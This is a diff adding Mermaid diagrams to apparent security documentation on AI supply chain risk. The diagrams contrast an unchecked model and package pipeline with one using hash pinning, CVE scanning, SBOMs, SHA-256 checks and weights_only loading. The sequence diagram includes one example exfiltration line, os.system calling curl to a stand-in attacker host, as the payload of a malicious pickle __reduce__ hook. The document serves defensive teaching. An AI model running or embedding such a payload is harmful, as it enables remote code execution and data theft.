@@ -4,6 +4,89 @@
 
 ---
 
+## Architecture and sequence diagrams
+
+### Architecture diagram — attack vs mitigation
+
+Supply chain attacks happen before the application runs. The vulnerable pipeline has no integrity checks at any stage. The mitigated pipeline adds three checkpoints: dependency CVE scanning (pip-audit), SBOM generation (Syft/Grype), and model file integrity verification (SHA-256 + `weights_only=True`) before any model is loaded.
+
+```mermaid
+graph TD
+    subgraph VULNERABLE["❌ Vulnerable supply chain"]
+        V_PYPI[PyPI / package index] -->|unpinned install| V_DEP[Installed packages\nno CVE check]
+        V_REG[Model registry / HuggingFace] -->|no hash check| V_MODEL[Model file\ntrusted blindly]
+        V_MODEL -->|torch.load — pickle executes| V_APP[Application\nRCE possible]
+        V_DEP --> V_APP
+        V_ATK[/"Attacker: typosquat\nor backdoored model"/] -.->|silent substitution| V_PYPI
+        V_ATK -.->|malicious .pt file| V_REG
+    end
+
+    subgraph MITIGATED["✅ Mitigated supply chain"]
+        M_PYPI[PyPI] -->|hash-pinned requirements| M_DEP[Installed packages]
+        M_DEP --> M_AUDIT[pip-audit\nCVE scan]
+        M_AUDIT -->|vulnerabilities found → fail CI| M_BLOCK([CI blocked])
+        M_AUDIT -->|clean| M_SBOM[Syft SBOM\nGrype scan]
+        M_SBOM -->|clean| M_APP[Application]
+        M_REG[Model registry] -->|download| M_MODEL[Model file]
+        M_MODEL --> M_HASH[SHA-256 verify\nagainst known-good DB]
+        M_HASH -->|mismatch → abort| M_BLOCK2([Load aborted])
+        M_HASH -->|match| M_SAFE[torch.load\nweights_only=True]
+        M_SAFE --> M_APP
+    end
+
+    style VULNERABLE fill:#fff0f0,stroke:#ff4444
+    style MITIGATED  fill:#f0fff0,stroke:#44aa44
+```
+
+---
+
+### Sequence diagram — pickle exploit attack and mitigation
+
+**Steps:**
+1. An attacker publishes a malicious model file whose `.pt` serialisation contains a `__reduce__` method that executes an OS command.
+2. **Vulnerable path**: `torch.load()` without `weights_only=True` deserialises the file using Python's `pickle`, triggering arbitrary code execution.
+3. **Mitigated path**:
+   - Step 3: Before loading, `verify_model()` computes the SHA-256 hash of the file and compares it against the integrity database. An unregistered or tampered file raises an exception and loading never happens.
+   - Step 4: Even if the hash check passed, `torch.load(weights_only=True)` blocks the `__reduce__` pickle hook, preventing code execution.
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Attacker
+    participant Registry as Model registry
+    participant App
+    participant Verify as verify_model()
+    participant Torch as torch.load()
+
+    Note over Attacker,Torch: Pickle exploit — VULNERABLE path
+    Attacker->>Registry: upload malicious model.pt (contains __reduce__ payload)
+    App->>Registry: download model.pt
+    Registry-->>App: malicious model.pt
+    App->>Torch: torch.load("model.pt")
+    Torch->>Torch: pickle.load() — executes __reduce__
+    Torch-->>App: ❌ os.system("curl attacker.com/exfil") executed
+
+    Note over Attacker,Torch: Pickle exploit — MITIGATED path
+    Attacker->>Registry: upload malicious model.pt
+    App->>Registry: download model.pt
+    Registry-->>App: malicious model.pt
+    App->>Verify: verify_model("model.pt")
+    Verify->>Verify: compute SHA-256
+    Verify->>Verify: compare against integrity DB
+    alt File not registered
+        Verify-->>App: ❌ KeyError — model not in integrity database
+    else Hash mismatch
+        Verify-->>App: ❌ ValueError — hash mismatch, file tampered
+    else Hash matches
+        Verify-->>App: ✅ Integrity check passed
+        App->>Torch: torch.load("model.pt", weights_only=True)
+        Torch->>Torch: blocks __reduce__ / pickle hooks
+        Torch-->>App: ✅ Safe tensor dict loaded
+    end
+```
+
+---
+
 ## What is this risk?
 
 The AI supply chain spans every component involved in building and deploying an LLM application: pre-trained model weights, fine-tuning datasets, Python dependencies, plugins, and third-party integrations. A compromise at any point in this chain can silently undermine the security of the final application.
